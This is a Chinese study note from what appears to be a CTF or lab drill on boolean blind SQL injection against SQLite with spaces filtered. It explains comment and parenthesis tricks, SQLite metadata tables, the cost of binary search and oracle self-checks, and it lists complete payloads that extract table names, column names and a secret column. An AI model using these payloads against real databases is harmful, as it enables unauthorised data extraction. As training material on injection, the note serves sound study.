## 二、知识点

### 1. `--` 注释不用带空格也能生效，但注释掉的只有引号

payload `admin'AND(1=1)--` 拼进去是：

```sql
SELECT id FROM users WHERE username = 'admin'AND(1=1)--' AND is_active = 1
```

`--` 之后**整段被注释掉**，包括原句的收尾引号和 `AND is_active = 1`。所以闭合一次、注释一次，中间就可以随便写。

**这是"只禁空格"题的核心**：`-- ` 的尾空格本来就是为了"避免把下一行内容也吃掉"，单行 SQL 里不需要它。

### 2. 括号能顶替空格，是因为 SQL 分析器按 token 走

`select(group_concat(name))from(sqlite_master)` 能跑，原因是：

```
select  (group_concat(name))  from  (sqlite_master)
  ↑          ↑                 ↑        ↑
关键字    表达式（括号内）    关键字   表（括号包起来当子查询/表名）
```

**不需要空白字符，只要 token 边界明确**。括号天生就是边界，所以 `select(`、`)from(`、`)` 这些位置都能省掉空格。

### 3. SQLite 的元数据在 `sqlite_master`，不在 `information_schema`

| 要什么 | MySQL | SQLite |
|---|---|---|
| 表名 | `information_schema.tables` | `sqlite_master`（`type='table'`） |
| 列名 | `information_schema.columns` | `pragma_table_info('表名')`（表值函数） |
| 码点 | `ascii()` | `unicode()` |
| 拼多行 | `group_concat()` | 同名可用 |

今天实测出来的表名里多了两个 SQLite 自带的：

```
users, sqlite_autoindex_users_1, sqlite_sequence
```

`sqlite_sequence` 是 `AUTOINCREMENT` 自动建的，`sqlite_autoindex` 是 `UNIQUE` 约束自动建的 —— 看到这两个就能确认是 SQLite，不用猜。

### 4. 盲注的开销算法：一个字符约 7 次请求

```
152 次 / "SYC{local_drill_flag}" 19 个字符 ≈ 8 次/字符
577 次 / 表名+列名（约 70 字符）    ≈ 8 次/字符
```

二分法把 ASCII 可见字符区间 95 个压到 `log₂95 ≈ 7` 次。**这就是为什么要先求 length**：知道长度才能规划请求数，不然要一直问到收到空字符。

### 5. 预言机自检是脚本能不能信的前提

```python
if not oracle("1=1"):  exit("预言机不通")
if oracle("1=2"):      exit("预言机异常")
```

今天沙盘的回显只有两种，看着很干净，但**干净不代表判据对**：如果 `1=2` 也返回"存在"，整个脚本会一路输出垃圾字符而不报错。先跑这 3 步（含子查询自检），能省掉后面 500 次请求的调试。

## 三、案例 / payload

### 1. 判断注入点（空格被禁版）

```
admin'AND(1=1)--     → 存在
admin'AND(1=2)--     → 不存在
```

### 2. 爆表名

```
admin'AND(unicode(substr((select(group_concat(name))from(sqlite_master)),1,1))=117)--
```

117 = `u`，实测命中（`users` 排第一）。**注意**：`sqlite_master` 里还有 `sqlite_autoindex_users_1` 和 `sqlite_sequence`，`group_concat` 会把它们全拼上，所以第一个字符是 `u` 不是 `s`。

### 3. 爆列名

```
admin'AND(unicode(substr((select(group_concat(name))from(pragma_table_info('users'))),1,1))=105)--
```

105 = `i`，实测是 `id`。

### 4. 爆数据

```
admin'AND(unicode(substr((select(group_concat(secret))from(users)),1,1))=83)--
```

83 = `S`，`secret` 列首位。
